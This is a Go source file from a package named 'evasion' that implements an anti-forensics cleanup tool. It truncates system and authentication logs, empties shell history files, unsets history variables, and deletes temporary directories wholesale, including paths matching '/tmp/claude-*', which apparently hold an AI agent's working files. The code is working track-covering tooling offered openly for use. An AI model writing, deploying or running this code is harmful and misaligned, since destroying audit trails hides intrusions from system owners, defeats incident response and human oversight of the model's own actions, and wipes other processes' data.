package evasion

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

type LogCleanup struct {
	config *CleanupConfig
	mu     sync.Mutex
	log    []string
}

func NewLogCleanup(config *CleanupConfig) *LogCleanup {
	if config == nil {
		config = NewDefaultCleanupConfig()
	}
	return &LogCleanup{
		config: config,
		log:    make([]string, 0),
	}
}

func (lc *LogCleanup) ClearEventLogs() error {
	lc.mu.Lock()
	defer lc.mu.Unlock()

	if lc.config.DryRun {
		lc.log = append(lc.log, "[DRY RUN] Would clear event logs")
		return nil
	}

	eventLogPaths := []string{
		"/var/log/syslog",
		"/var/log/messages",
		"/var/log/auth.log",
		"/var/log/secure",
		"/var/log/kern.log",
		"/var/log/dmesg",
	}

	var lastErr error
	for _, path := range eventLogPaths {
		if _, err := os.Stat(path); os.IsNotExist(err) {
			continue
		}

		if err := lc.clearLogFile(path); err != nil {
			lastErr = err
			lc.log = append(lc.log, fmt.Sprintf("[WARN] Failed to clear %s: %v", path, err))
			continue
		}
		lc.log = append(lc.log, fmt.Sprintf("[OK] Cleared %s", path))
	}

	if lastErr != nil {
		return fmt.Errorf("failed to clear some event logs: %w", lastErr)
	}
	return nil
}

func (lc *LogCleanup) clearLogFile(path string) error {
	if lc.config.MaxAge > 0 {
		info, err := os.Stat(path)
		if err != nil {
			return err
		}
		if time.Since(info.ModTime()) > lc.config.MaxAge {
			lc.log = append(lc.log, fmt.Sprintf("[SKIP] %s older than max age", path))
			return nil
		}
	}

	file, err := os.OpenFile(path, os.O_WRONLY|os.O_TRUNC, 0)
	if err != nil {
		return err
	}
	defer file.Close()

	lc.log = append(lc.log, fmt.Sprintf("[OK] Truncated %s", path))
	return nil
}

func (lc *LogCleanup) ClearPrefetch() error {
	lc.mu.Lock()
	defer lc.mu.Unlock()

	if lc.config.DryRun {
		lc.log = append(lc.log, "[DRY RUN] Would clear prefetch files")
		return nil
	}

	prefetchDirs := []string{
		"/var/tmp/.prefetch",
		"/tmp/.prefetch_cache",
		"/dev/shm/.prefetch",
	}

	var lastErr error
	for _, dir := range prefetchDirs {
		if _, err := os.Stat(dir); os.IsNotExist(err) {
			continue
		}

		if err := lc.removeDirectoryContents(dir); err != nil {
			lastErr = err
			lc.log = append(lc.log, fmt.Sprintf("[WARN] Failed to clear %s: %v", dir, err))
			continue
		}
		lc.log = append(lc.log, fmt.Sprintf("[OK] Cleared prefetch dir %s", dir))
	}

	if lastErr != nil {
		return fmt.Errorf("failed to clear some prefetch dirs: %w", lastErr)
	}
	return nil
}

func (lc *LogCleanup) ClearShellHistory() error {
	lc.mu.Lock()
	defer lc.mu.Unlock()

	if lc.config.DryRun {
		lc.log = append(lc.log, "[DRY RUN] Would clear shell history")
		return nil
	}

	homeDir, err := os.UserHomeDir()
	if err != nil {
		return fmt.Errorf("cannot get home dir: %w", err)
	}

	historyFiles := []string{
		filepath.Join(homeDir, ".bash_history"),
		filepath.Join(homeDir, ".zsh_history"),
		filepath.Join(homeDir, ".history"),
		filepath.Join(homeDir, ".local/share/fish/fish_history"),
		filepath.Join(homeDir, ".local/share/fish/fish_read_history"),
	}

	envHistory := os.Getenv("HISTFILE")
	if envHistory != "" {
		historyFiles = append(historyFiles, envHistory)
	}

	var lastErr error
	for _, path := range historyFiles {
		if _, err := os.Stat(path); os.IsNotExist(err) {
			continue
		}

		if err := lc.clearLogFile(path); err != nil {
			lastErr = err
			lc.log = append(lc.log, fmt.Sprintf("[WARN] Failed to clear %s: %v", path, err))
			continue
		}
		lc.log = append(lc.log, fmt.Sprintf("[OK] Cleared shell history %s", path))
	}

	lc.clearBashSessionHistory()

	if lastErr != nil {
		return fmt.Errorf("failed to clear some history files: %w", lastErr)
	}
	return nil
}

func (lc *LogCleanup) clearBashSessionHistory() {
	os.Unsetenv("HISTFILE")
	os.Unsetenv("HISTSIZE")
	os.Unsetenv("HISTFILESIZE")
	os.Setenv("HISTCONTROL", "ignoreboth")
}

func (lc *LogCleanup) ClearForensicArtifacts() error {
	lc.mu.Lock()
	defer lc.mu.Unlock()

	if lc.config.DryRun {
		lc.log = append(lc.log, "[DRY RUN] Would clear forensic artifacts")
		return nil
	}

	artifactPaths := []string{
		"/tmp/.org.chromium.Chromium.*",
		"/tmp/pip-*",
		"/tmp/go-build*",
		"/tmp/hsperfdata_*",
		"/tmp/claude-*",
		"/dev/shm/*",
	}

	var lastErr error
	for _, pattern := range artifactPaths {
		matches, err := filepath.Glob(pattern)
		if err != nil {
			continue
		}

		for _, match := range matches {
			if lc.config.MaxAge > 0 {
				info, err := os.Stat(match)
				if err != nil {
					continue
				}
				if time.Since(info.ModTime()) > lc.config.MaxAge {
					continue
				}
			}

			if err := os.RemoveAll(match); err != nil {
				lastErr = err
				lc.log = append(lc.log, fmt.Sprintf("[WARN] Failed to remove %s: %v", match, err))
				continue
			}
			lc.log = append(lc.log, fmt.Sprintf("[OK] Removed artifact %s", match))
		}
	}

	lc.clearTempDirArtifacts()

	if lastErr != nil {
		return fmt.Errorf("failed to clear some forensic artifacts: %w", lastErr)
	}
	return nil
}

func (lc *LogCleanup) clearTempDirArtifacts() {
	tmpDirs := []string{"/tmp", "/var/tmp", "/dev/shm"}
	for _, dir := range tmpDirs {
		entries, err := os.ReadDir(dir)
		if err != nil {
			continue
		}

		for _, entry := range entries {
			if strings.HasPrefix(entry.Name(), ".") {
				continue
			}
			fullPath := filepath.Join(dir, entry.Name())
			if err := os.RemoveAll(fullPath); err != nil {
				lc.log = append(lc.log, fmt.Sprintf("[WARN] Failed to remove %s: %v", fullPath, err))
				continue
			}
			lc.log = append(lc.log, fmt.Sprintf("[OK] Removed temp entry %s", fullPath))
		}
	}
}

func (lc *LogCleanup) removeDirectoryContents(dir string) error {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return err
	}

	for _, entry := range entries {
		path := filepath.Join(dir, entry.Name())
		if err := os.RemoveAll(path); err != nil {
			return err
		}
	}
	return nil
}

func (lc *LogCleanup) FullCleanup() error {
	lc.mu.Lock()
	defer lc.mu.Unlock()

	lc.log = append(lc.log, "=== Starting Full Cleanup ===")

	if lc.config.DryRun {
		lc.log = append(lc.log, "[DRY RUN] Full cleanup would be performed")
		return nil
	}

	var errors []string

	if lc.config.ClearEventLogs {
		if err := lc.clearEventLogsInternal(); err != nil {
			errors = append(errors, fmt.Sprintf("event logs: %v", err))
		}
	}

	if lc.config.ClearPrefetch {
		if err := lc.clearPrefetchInternal(); err != nil {
			errors = append(errors, fmt.Sprintf("prefetch: %v", err))
		}
	}

	if lc.config.ClearShellHistory {
		if err := lc.clearShellHistoryInternal(); err != nil {
			errors = append(errors, fmt.Sprintf("shell history: %v", err))
		}
	}

	if lc.config.ClearForensics {
		if err := lc.clearForensicArtifactsInternal(); err != nil {
			errors = append(errors, fmt.Sprintf("forensic artifacts: %v", err))
		}
	}

	lc.log = append(lc.log, "=== Full Cleanup Complete ===")

	if len(errors) > 0 {
		return fmt.Errorf("cleanup completed with errors: %s", strings.Join(errors, "; "))
	}
	return nil
}

func (lc *LogCleanup) clearEventLogsInternal() error {
	eventLogPaths := []string{
		"/var/log/syslog",
		"/var/log/messages",
		"/var/log/auth.log",
		"/var/log/secure",
		"/var/log/kern.log",
	}

	var lastErr error
	for _, path := range eventLogPaths {
		if _, err := os.Stat(path); os.IsNotExist(err) {
			continue
		}
		if err := lc.clearLogFile(path); err != nil {
			lastErr = err
			lc.log = append(lc.log, fmt.Sprintf("[WARN] Failed to clear %s: %v", path, err))
			continue
		}
		lc.log = append(lc.log, fmt.Sprintf("[OK] Cleared %s", path))
	}
	return lastErr
}

func (lc *LogCleanup) clearPrefetchInternal() error {
	prefetchDirs := []string{
		"/var/tmp/.prefetch",
		"/tmp/.prefetch_cache",
	}

	var lastErr error
	for _, dir := range prefetchDirs {
		if _, err := os.Stat(dir); os.IsNotExist(err) {
			continue
		}
		if err := lc.removeDirectoryContents(dir); err != nil {
			lastErr = err
			lc.log = append(lc.log, fmt.Sprintf("[WARN] Failed to clear %s: %v", dir, err))
			continue
		}
		lc.log = append(lc.log, fmt.Sprintf("[OK] Cleared prefetch dir %s", dir))
	}
	return lastErr
}

func (lc *LogCleanup) clearShellHistoryInternal() error {
	homeDir, err := os.UserHomeDir()
	if err != nil {
		return err
	}

	historyFiles := []string{
		filepath.Join(homeDir, ".bash_history"),
		filepath.Join(homeDir, ".zsh_history"),
		filepath.Join(homeDir, ".history"),
	}

	var lastErr error
	for _, path := range historyFiles {
		if _, err := os.Stat(path); os.IsNotExist(err) {
			continue
		}
		if err := lc.clearLogFile(path); err != nil {
			lastErr = err
			lc.log = append(lc.log, fmt.Sprintf("[WARN] Failed to clear %s: %v", path, err))
			continue
		}
		lc.log = append(lc.log, fmt.Sprintf("[OK] Cleared %s", path))
	}
	return lastErr
}

func (lc *LogCleanup) clearForensicArtifactsInternal() error {
	tmpDirs := []string{"/tmp", "/var/tmp"}
	var lastErr error

	for _, dir := range tmpDirs {
		entries, err := os.ReadDir(dir)
		if err != nil {
			continue
		}

		for _, entry := range entries {
			if strings.HasPrefix(entry.Name(), ".") {
				continue
			}
			fullPath := filepath.Join(dir, entry.Name())
			if lc.config.MaxAge > 0 {
				info, err := os.Stat(fullPath)
				if err != nil {
					continue
				}
				if time.Since(info.ModTime()) > lc.config.MaxAge {
					continue
				}
			}

			if err := os.RemoveAll(fullPath); err != nil {
				lastErr = err
				lc.log = append(lc.log, fmt.Sprintf("[WARN] Failed to remove %s: %v", fullPath, err))
				continue
			}
			lc.log = append(lc.log, fmt.Sprintf("[OK] Removed %s", fullPath))
		}
	}
	return lastErr
}

func (lc *LogCleanup) GetLog() []string {
	lc.mu.Lock()
	defer lc.mu.Unlock()
	result := make([]string, len(lc.log))
	copy(result, lc.log)
	return result
}

func (lc *LogCleanup) ResetLog() {
	lc.mu.Lock()
	defer lc.mu.Unlock()
	lc.log = lc.log[:0]
}

func (lc *LogCleanup) GetConfig() *CleanupConfig {
	return lc.config
}
